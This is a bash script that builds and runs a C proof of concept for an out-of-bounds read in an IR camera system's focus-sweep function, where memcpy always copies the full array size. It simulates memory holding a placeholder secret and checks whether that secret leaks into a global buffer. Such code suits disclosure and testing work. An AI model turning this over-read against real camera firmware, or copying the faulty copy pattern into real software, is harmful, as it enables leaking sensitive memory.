#!/bin/bash
# Proof of Concept for OOB Read and Info Leak in ir_camera_system_hw.c

cat <<EOF > poc_main.c
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>

#define MAX_NUMBER_OF_FOCUS_VALUES 200

// Vulnerable function implementation from main_board/src/optics/ir_camera_system/ir_camera_system_hw.c
int16_t global_focus_values[MAX_NUMBER_OF_FOCUS_VALUES];
size_t global_num_focus_values;
int use_focus_sweep_polynomial;

void ir_camera_system_set_focus_values_for_focus_sweep_hw(int16_t *focus_values,
                                                     size_t num_focus_values)
{
    global_num_focus_values = num_focus_values;
    // THE VULNERABILITY: sizeof(global_focus_values) is always used as the copy size,
    // regardless of the actual number of values provided.
    memcpy(global_focus_values, focus_values, sizeof(global_focus_values));
    use_focus_sweep_polynomial = 0;
}

// Simulation of the memory layout
typedef struct {
    int16_t attacker_data[5]; // Attacker provides only a few values
    char padding[10];
    char sensitive_stack_data[256];
} SimulationBuffer;

int main() {
    SimulationBuffer sim;
    memset(&sim, 0, sizeof(sim));

    // Attacker sends a pointer to some buffer
    sim.attacker_data[0] = 0x1337;

    // Sensitive data following the buffer
    strcpy(sim.sensitive_stack_data, "CONFIDENTIAL_PRIVATE_KEY_OR_TOKEN");

    printf("[+] Memory layout simulation: sim struct at %p\n", (void*)&sim);
    printf("[+] Sensitive data at %p\n", (void*)sim.sensitive_stack_data);

    printf("[+] Calling vulnerable function with focus_values pointer = %p\n", (void*)sim.attacker_data);
    ir_camera_system_set_focus_values_for_focus_sweep_hw(sim.attacker_data, 5);

    printf("[+] Checking if sensitive data was leaked into global_focus_values...\n");

    char *leak_search = (char*)global_focus_values;
    // Search the entire copied buffer for the sensitive string
    int found = 0;
    for (int i = 0; i < sizeof(global_focus_values) - 12; i++) {
        if (memcmp(&leak_search[i], "CONFIDENTIAL", 12) == 0) {
            printf("[!] PoC SUCCESS: Sensitive data leaked into global_focus_values array at offset %d!\n", i);
            printf("[!] Leaked string found: %s\n", &leak_search[i]);
            found = 1;
            break;
        }
    }

    if (!found) {
        printf("[-] PoC FAILED: Leak not detected in the copied %zu bytes.\n", sizeof(global_focus_values));
        return 1;
    }
    return 0;
}
EOF

gcc -O0 poc_main.c -o poc
./poc
rm poc_main.c poc
